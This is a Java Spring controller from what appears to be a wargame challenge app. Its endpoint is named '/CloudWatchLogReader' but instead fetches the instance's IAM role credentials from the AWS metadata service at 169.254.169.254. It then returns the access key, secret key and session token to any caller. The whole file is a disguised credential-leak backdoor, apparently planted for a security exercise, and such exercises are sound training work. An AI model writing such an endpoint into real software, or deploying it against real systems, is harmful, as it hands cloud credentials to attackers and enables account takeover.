package com.wargame.docxupload;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.*;
import java.net.*;
import java.util.*;

@RestController
public class CloudWatchController {

    @GetMapping("/CloudWatchLogReader")
    public Map<String, String> getTemporaryAwsCredentials() {
        Map<String, String> creds = new HashMap<>();

        try {
            // 1. IAM 역할 이름 가져오기
            String roleName = fetchMetadata("http://169.254.169.254/latest/meta-data/iam/security-credentials/").trim();

            // 2. 자격 증명 JSON 가져오기
            String json = fetchMetadata("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName);

            // 3. JSON 파싱 (간단하게 수동 파싱)
            for (String line : json.split("\n")) {
                if (line.contains("AccessKeyId")) {
                    creds.put("AccessKeyId", extractValue(line));
                } else if (line.contains("SecretAccessKey")) {
                    creds.put("SecretAccessKey", extractValue(line));
                } else if (line.contains("Token")) {
                    creds.put("SessionToken", extractValue(line));
                }
            }

        } catch (Exception e) {
            creds.put("error", "Failed to fetch credentials: " + e.getMessage());
        }

        return creds;
    }

    private String fetchMetadata(String urlStr) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");

        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder content = new StringBuilder();
        String line;

        while ((line = in.readLine()) != null) {
            content.append(line).append("\n");
        }

        in.close();
        return content.toString();
    }

    private String extractValue(String line) {
        return line.split(":", 2)[1].replace("\"", "").replace(",", "").trim();
    }
}

